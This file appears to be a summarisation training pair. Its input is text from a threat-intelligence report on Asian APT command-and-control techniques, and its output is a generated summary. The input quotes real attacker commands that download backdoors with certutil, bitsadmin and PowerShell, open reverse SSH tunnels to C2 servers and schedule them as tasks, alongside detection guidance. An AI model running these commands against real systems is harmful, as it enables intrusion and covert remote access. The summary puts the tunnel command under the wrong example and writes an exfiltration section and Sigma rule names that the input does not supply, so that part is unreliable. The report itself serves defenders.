@@ -1,0 +1,391 @@
+
+
+
+Sentence : Command and Control TA0011
+Application Layer Protocol T1071
+Basic description
+Contents 264
+Many APT groups use remote command and control centers (C2) in their attacks. Threat actors most
+frequently use an application-layer protocol to interact with their own servers. This lets them blend in with the
+traffic among other legitimate connections. Attackers may receive commands from their C2 server and send
+the results of command execution back to the server.
+The most popular application-layer protocol is HTTP(S). We give some examples of its usage below in the
+description of the subtechnique known as Web Protocols T1071.001.
+Technical details  |  Command and Control TA0011  |  Application Layer Protocol: Web Protocols T1071.001
+Application Layer Protocol: Web Protocols T1071.001
+Basic description
+Contents 265
+As we already mentioned, the Web Protocols subtechnique is the most popular subtechnique for Command
+and Control. Protocols such as HTTP(S) and WebSocket are extremely popular for transmitting web traffic
+in most companies. HTTP(S) packets contain a multitude of fields and headers that may be concealing data.
+Asian APT groups use these protocols to communicate with their C2 from their victim's network by imitating
+normal, expected traffic.
+Examples of procedures
+Example 1
+The APT group known as ToddyCat communicated with a C2 over the HTTPS protocol. After establishing a
+connection with its C2 server, a ToddyCat remote access tool (RAT) was able to run on the victim's machine
+commands received from a remote operator.
+Image_path: C:\Windows\system32\wusa.exe
+URLs:
+hxxps://154.202.56[.]211/collector/3.0/
+hxxps://45.124.115[.]83/collector/3.0/
+Example 2
+The APT group known as CopperTurtle, which primarily conducts attacks in East Asia, also used the HTTPS
+protocol to interact with their C2. Below is an example of a GET request used to download a backdoor
+(FCDCA94DA890ABCF17FB06C5CD213B37):
+Image_path: C:\Program files (x86)\adobe\acrobat dc\acrobat.exe
+GET /aall.aspx HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: resume.bounceme[.]net:443
+Cache-Control: no-cache
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Application Layer Protocol: Web Protocols T1071.001
+Contents 266
+After the backdoor was loaded into memory, it forwarded the information collected about its victim to a C2
+server. In turn, the specific commands to execute on the victim's system were sent from the C2 server to the
+backdoor.
+Example 3
+The backdoor known as PlugX, which is popular among Asian APT groups, also uses the HTTP protocol to
+interact with a C2 server. Here, the User-Agent string is also masqueraded as a legitimate one:
+Image_path: “C:\Program Files (x86)\HP Digital\aro.exe”
+Technical details  |  Command and Control TA0011  |  Application Layer Protocol: Web Protocols T1071.001
+Command name Command description
+ls Get a list of objects in the specified directory.
+execute Run an arbitrary file or command.
+getcomputername Get the computer's name.
+Contents 267
+upload
+Download a file to an infected system and save it with the specified name. Information
+about the download result is forwarded to the server at mirror-exchange[.]com/upload/
+with the system ID (GET parameter "id"), file name and error code (GET parameter "file")
+specified.
+exit Terminate the backdoor.
+Detection
+All of the analyzed examples attempt to look legitimate, which makes detection of the Application Layer
+Protocol: Web Protocols T1071.001 technique more difficult.
+Malicious activity related to communication with C2 is detected primarily by conducting a Suricata-based
+signature analysis of traffic in IDS/IPS systems. Kaspersky Anti Targeted Attack Platform includes network
+traffic analysis (NTA) and has a built-in Suricata rules database. The IDS rule sets are automatically and
+promptly updated. KATA also uses reputation data for URLs linked to the infrastructure of APT groups.
+One of the ways to detect this technique in SIEM systems is to track network connections from trusted
+legitimate processes such as Microsoft Office and Adobe applications. You can also track the startup of
+console-based utilities used for network data transfer (curl, wget).
+Companies can additionally enable threat intelligence (TI) sources to detect interaction with C2 servers.
+Event source Log Event ID
+Windows Security 4688, 5156
+Sysmon Sysmon 1, 3, 22
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Web Service T1102
+Web Service T1102
+Basic description
+Contents 268
+The Web Service T1102 technique uses existing legitimate web services to transfer data between the victim's
+computer and a remote system. Popular websites and social networks can be used to effectively conceal
+communication with a C2 because hosts on a network are likely already communicating with such sites and
+media. Moreover, most web services normally use SSL/TLS encryption, which provides attackers with an
+additional layer of protection from detection.
+Popular social networks or cloud services are most frequently used for C2 communication. We know of several
+examples of Asian APT groups abusing publicly accessible cloud storage.
+Examples of procedures
+Example 1
+In the WebDav-O attacks, attackers developed a method of C2 communication using the popular cloud
+storage services of Dropbox, Yandex, and Mail.
+Commands intended for the implant were stored in files residing in cloud storage. The implant also forwarded
+command execution results to cloud storage.
+Image_path: C:\Windows\system32\svchost.exe
+URL host: “webdav.yandex.ru”
+To access the storage, the implant code included the account credentials required for negotiating the
+encryption key. Files containing commands were encrypted with this key.
+Example 2
+GitHub is also a popular option for a C2 server. For example, the PlugX backdoor was downloaded from GitHub:
+“$system32\cmd.exe” /c bitsadmin /transfer n
+https://raw/githubusercontent.com/tellyou123/1/master/aro.dat $temp\aro.dat >
+C:\inetpub\wwwroot\aspnet_client\1.txt
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Web Service T1102
+Detection
+Contents 269
+To detect the Web Service technique, you must track network requests that are sent to popular web services
+such as cloud storages, GitHub, social media networks, and various messengers like Telegram or Discord
+from processes that normally do not communicate with such services. In a correlation rule, you can filter
+applications used to work with the cloud and other services, as well as popular web browsers. Customized
+exclusions and filters can be configured for each company, and appropriate correlation rules must be trained
+accordingly.
+Do not forget that malicious files can masquerade as legitimate processes by using various techniques, such
+as Process Injection T1055, Masquerading T1036, and Hijack Execution Flow T1574. To detect these techniques,
+please refer to the corresponding sections describing these techniques.
+Event source Log Event ID
+Windows Security 4688, 5156
+Sysmon Sysmon 1, 3, 22
+SIGMA rules
+
+
+Sigma-Generic-Network Connection to Cloud Storage
+
+
+Sigma-Generic-Network Connection to Cloud Storage in Command Line
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Ingress Tool Transfer T1105
+Ingress Tool Transfer T1105
+Basic description
+Contents 270
+Asian APT groups download malicious files in several stages during their attacks. Second-stage malware is
+downloaded to a target host from a C2 server that stores malicious files for subsequent stages as well as
+auxiliary tools for supporting an attack.
+Files are also transferred using various web services (as described above) or other systems available to the
+attacker. In Windows, attackers can use various file download tools, such as certutil, bitsadmin, and PowerShell.
+Examples of procedures
+Example 1
+In the Indonesian incident, a backdoor was downloaded using the legitimate Windows tool named certutil.exe
+(LOLBin):
+C:\Windows\system32\cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.]104:8099/MEUpdate.exe
+C:\Windows\Help\Help\MEUpdate.exe
+Attackers also used the PowerShell cmdlet Invoke-WebRequest (alias iwr ) to download a malicious file:
+C:\Windows\system32\cmd.exe /c PowerShell iwr -Uri hxxp://8.210.141[.]104:8099/1.txt -OutFile c:\1.txt
+-UseBasicParsing"
+Example 2
+The Ingress Tool Transfer T1105 technique was also used in the attack on Pakistan involving the ShadowPad
+and PlugX backdoors. In this case, the APT group downloaded a backdoor from GitHub using bitsadmin:
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Ingress Tool Transfer T1105
+C:\Windows\system32\cmd.exe /c bitsadmin /transfer n
+https://raw/githubusercontent.com/tellyou123/1/master/aro.dat $temp\aro.dat >
+C:\inetpub\wwwroot\aspnet_client\1.txt
+Contents 271
+Another example from this incident demonstrates the use of the PowerShell cmdlet Start-BitsTransfer. In
+this case, the second-stage Stowaway implant is extracted as follows:
+PowerShell "Start-BitsTransfer -Source hxxp://security.lomiasecure[.]net/crx/node.txt -Destination
+C:\users\public\node.txt -transfertype download"
+PowerShell if($InputString = Get-Content 'C:\users\public\node.txt') {
+Convert]::FromBase64String($InputString) ) }
+Example 3
+In Incident 4 that we analyzed, the APT group ToddyCat used its own RAT to download additional tools to the
+victim's computer. These tools included a data collection script and an archiver.
+Detection
+To detect the Ingress Tool Transfer T1105 technique, you must track network connections (for example, those
+involving Sysmon Event ID 3) and process creation events.
+One detection approach is to track network interactions from legitimate trusted processes, such as Microsoft
+Office and Adobe ones.
+As described above, you can create correlation rules for network requests that are sent to popular web
+services such as cloud storages, GitHub, social networks, and various messengers like Telegram or Discord
+from the processes that normally do not communicate with such services. Another way is to track the startup
+of console-based utilities that enable downloading of files from external systems:
+
+
+PowerShell
+
+
+Curl
+
+
+Certutil
+
+
+Bitsadmin
+
+
+and many others
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Ingress Tool Transfer T1105
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1, 3
+Microsoft-Windows-PowerShell/
+Windows 4103, 4104
+Operational
+SIGMA rules
+
+
+Sigma-Generic-Network Connection to Cloud Storage
+
+
+Sigma-Generic-Network Connection to Cloud Storage in Command Line
+
+
+Sigma-Generic-Ingress Tool Transfer via certutil
+
+
+Sigma-Generic-Ingress Tool Transfer via curl.exe
+
+
+Sigma-Generic-File Download via Bitsadmin
+
+
+Sigma-Generic-Execution of Downloaded PowerShell Code
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 272
+Technical details  |  Command and Control TA0011  |  Protocol Tunneling T1572
+Protocol Tunneling T1572
+Basic description
+Contents 273
+Attackers tunnel traffic from or to target systems. This lets them conceal their original protocol by wrapping
+it with another protocol to bypass the security measures (NAT and firewall) of the target company for lateral
+movement through the network or communication with C2. Protocol Tunneling is also used for access to
+network segments/resources that can only be accessed by connecting from an internal network of the
+company (Pivoting).
+A typical example of tunneling is SSH port forwarding. Attackers use it to exchange information over an
+encrypted SSH channel.
+Examples of procedures
+Example 1
+In one attack, an Asian APT group used SSH tunneling (port forwarding) to communicate with a C2 server.
+Attackers used the plink.exe utility (in the command below, ppp.exe is a copy of plink):
+ppp.exe -c -n -r 45693:10.10.11.15:22 user@202.21.116.154 -p 443 -pw password
+After the command is executed, the traffic received by port 45693 of the attacked host is forwarded to port
+22 of host 10.10.11.15. The APT group uses a port that is not typical for SSH (the "-p 443" option), therefore the
+connection with C2 will look like a normal connection over HTTPS at first glance. The figure below illustrates the
+interaction between hosts:
+Figure 66 Interaction between hosts via SSH tunneling
+Por 443
+Attacker Host Compromised system 10.11.11.15
+Por 45693 Por 22
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Protocol Tunneling T1572
+This scheme allows attackers to gain remote access to an internal resource over SSH.
+Example 2
+Here's another example of an SSH tunnel that is established on a schedule:
+Contents 274
+"C:\Program Files\OpenSSH\ssh.exe" -i C:\Windows\AppReadiness\read.ini -o
+StrictHostKeyChecking=accept-new -R 50846:localhost:7070 systemtest06@103.27.202[.]85 -p 22222
+-fN
+In this case, a reverse SSH connection is established from the localhost to the attackers' C2 server
+103.27.202[.]85:22222. Inbound traffic to the localhost via port 50846 is forwarded to port 7070. An application
+listens to port 7070 on the localhost:
+Command_line: “C:\Intel\gxfintel.exe init”
+MD5: F2FD1AB5E8ABDF2201D7B47F3BB14758
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Protocol Tunneling T1572
+Other variants:
+MD5 File name
+C1A23D88B4665D0CF891C1173D6547B1 "C:\Windows\visio.exe" run
+Contents 275
+906A35ECFB29080200588BC7507BE114 "C:\Windows\System32\Office_Deployment.exe" connect
+62FC592D2D7A81E15177EB707BFE7F93 "C:\Windows\apppatch\App.exe" debug
+25C6363506A36378A9112B849106D5F8 "C:\Windows\system32\Office_setup.exe" start
+812B6213326341DE4E602D27F18B5AFF C:\Programdata\Adobe\Adobe.exe update
+DEEDEEA099AD1A00E46885D05C3F2EA3 C:\Users\public\n.exe init
+Creating a scheduled tunnel to port 445:
+schtasks /create /tn \Microsoft\Windows\Serv /tr "C:\PROGRA~1\OpenSSH\ssh.exe -i
+C:\Windows\AppReadiness\log.dat -o StrictHostKeyChecking=accept-new -R 50845:localhost:445
+systemtest05@103.27.202[.]85 -p 22222 -fN" /ru system /sc minute /mo 20 /f
+Example 3
+In another attack, an Asian APT group used the NATBypass utility, which is a tunnel forwarding tool intended
+for accessing the internal network of an infrastructure from the outside. We also noticed the iox [17] utility being
+used for port forwarding and traffic proxying.
+17
+iox
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Command and Control TA0011  |  Protocol Tunneling T1572 Contents 276
+Detection
+This technique can be detected with standard telemetry tools (Windows Events, Sysmon) by tracking typical
+command-line patterns in process creation events. Attack activity can also be detected by tracking network
+connection events that show an SSH connection to a non-standard port.
+You can set up another security beacon that tracks network connections to untrusted addresses or
+addresses with a bad reputation. To implement this protective measure, you must have up-to-date information
+about the IP addresses and domains of attackers. This type of information is provided by Kaspersky Threat
+Data Feeds.
+Learn more
+Event source Log Event ID
+Windows Security 4688, 5154
+Sysmon Sysmon 1, 3
+SIGMA rules
+
+
+Sigma-Generic-Protocol Tunneling via Plink Utility
+
+
+Sigma-Generic-Ssh Connection to non-standard port
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Exfiltration TA0010  |  Exfiltration Over Web Service T1567
+Output : 
+### Technical Details: Command and Control (C2) - Protocol Tunneling (T1572)
+
+#### Basic Description
+
+**Protocol Tunneling** involves wrapping traffic from or to target systems in another protocol. This technique is used by attackers to bypass security measures such as Network Address Translation (NAT) and firewalls, allowing them to move laterally within the network or communicate with Command and Control (C2) servers. Protocol Tunneling can also be used for pivoting, where attackers gain access to internal resources that are otherwise restricted to external connections.
+
+A common example of protocol tunneling is SSH port forwarding, which allows encrypted communication over an SSH channel.
+
+#### Examples of Procedures
+
+**Example 1: SSH Tunneling for C2 Communication**
+
+An Asian APT group used the `plink.exe` utility to establish an SSH tunnel for C2 communication:
+
+```bash
+ppp.exe -c -n -r 45693:10.10.11.15:22 user@202.21.116.154 -p 443 -pw password
+```
+
+- **Explanation**: The traffic received by port 45693 on the attacked host is forwarded to port 22 (SSH) of the internal host at 10.10.11.15. The SSH connection uses port 443, which is commonly used for HTTPS, making it appear like a normal HTTPS connection.
+
+**Example 2: Scheduled Reverse SSH Tunnel**
+
+Another example involves setting up a reverse SSH tunnel that runs on a schedule:
+
+```bash
+"C:\Program Files\OpenSSH\ssh.exe" -i C:\Windows\AppReadiness\read.ini -o StrictHostKeyChecking=accept-new -R 50846:localhost:7070 systemtest06@103.27.202[.]85 -p 22222 -fN
+```
+
+- **Explanation**: A reverse SSH connection is established from the localhost to the C2 server at 103.27.202[.]85 on port 22222. Traffic received by port 50846 on the localhost is forwarded to port 7070, where an application listens.
+
+**Example 3: NATBypass and iox Utilities**
+
+In another attack, the APT group used the `NATBypass` utility for accessing internal networks from the outside. The `iox` utility was also observed for port forwarding and traffic proxying:
+
+```bash
+schtasks /create /tn \Microsoft\Windows\Serv /tr "C:\PROGRA~1\OpenSSH\ssh.exe -i C:\Windows\AppReadiness\log.dat -o StrictHostKeyChecking=accept-new -R 50845:localhost:445 systemtest05@103.27.202[.]85 -p 22222 -fN" /ru system /sc minute /mo 20 /f
+```
+
+- **Explanation**: A scheduled task is created to establish an SSH tunnel from the localhost to the C2 server at 103.27.202[.]85 on port 22222. Traffic received by port 50845 on the localhost is forwarded to port 445 (SMB).
+
+#### Detection
+
+**Telemetry and Event Logs**
+
+- **Windows Events**: Track process creation events with command-line patterns that indicate SSH tunneling.
+- **Sysmon Events**: Monitor network connection events for connections to non-standard ports.
+
+**Security Beacons**
+
+- **Network Connections to Untrusted Addresses**: Set up alerts for connections to IP addresses or domains with bad reputations. Use threat intelligence feeds like Kaspersky Threat Data Feeds to maintain an updated list of malicious indicators.
+
+#### SIGMA Rules
+
+- **Sigma-Generic-Protocol Tunneling via Plink Utility**
+- **Sigma-Generic-Ssh Connection to non-standard port**
+
+### Technical Details: Exfiltration Over Web Service (T1567)
+
+**Exfiltration Over Web Service** involves using web services, such as HTTP or HTTPS, to exfiltrate data from a compromised system. This technique leverages the common nature of web traffic to bypass egress filtering and evade detection.
+
+#### Examples of Procedures
+
+- **HTTP/HTTPS Requests**: Data is encoded in HTTP requests (GET, POST) and sent to a C2 server.
+- **Web Shell**: A web shell is deployed on a compromised web server to facilitate data exfiltration.
+
+#### Detection
+
+**Telemetry and Event Logs**
+
+- **Windows Events**: Monitor for unusual network traffic patterns or large amounts of data being sent over HTTP/HTTPS.
+- **Sysmon Events**: Track process creation events that involve web browsers or other HTTP clients with suspicious command-line arguments.
+
+**Security Beacons**
+
+- **Unusual Data Volumes**: Set up alerts for large volumes of data being transmitted over web protocols.
+- **Threat Intelligence Feeds**: Use threat intelligence to identify known malicious domains and IP addresses involved in exfiltration activities.
+
+#### SIGMA Rules
+
+- **Sigma-Generic-Unusual HTTP Request Volume**
+- **Sigma-Generic-Suspicious Web Shell Activity**
+
+By combining these detection methods, organizations can better identify and respond to APT group activities involving protocol tunneling and data exfiltration over web services.
